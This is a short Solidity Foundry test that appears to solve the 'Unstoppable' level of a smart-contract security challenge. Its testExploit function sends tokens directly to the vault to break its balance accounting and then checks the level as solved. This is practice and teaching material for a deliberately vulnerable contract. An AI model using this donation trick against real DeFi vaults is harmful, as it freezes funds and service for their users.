// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../../src/unstoppable/UnstoppableLevel.sol";

contract UnstoppableTest is Test {
  UnstoppableLevel internal level = new UnstoppableLevel();

  function setUp() public {
    level.setup();
  }

  function testExploit() public {
    address token = address(level.token());
    address vault = address(level.vault());

    (bool success,) = token.call(abi.encodeWithSignature("transfer(address,uint256)", vault, 10));
    success;

    level.validate();
  }
}
